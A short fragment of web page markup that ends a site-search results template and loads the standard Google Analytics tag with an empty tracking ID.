class="fa fa-tag fa-fw"></i>{tags}</div></div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>' }); </script> <script async src="https://www.googletagmanager.com/gtag/js?id="></script> <script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments);} gtag('js', new Date()); gtag('config', ''); </script>
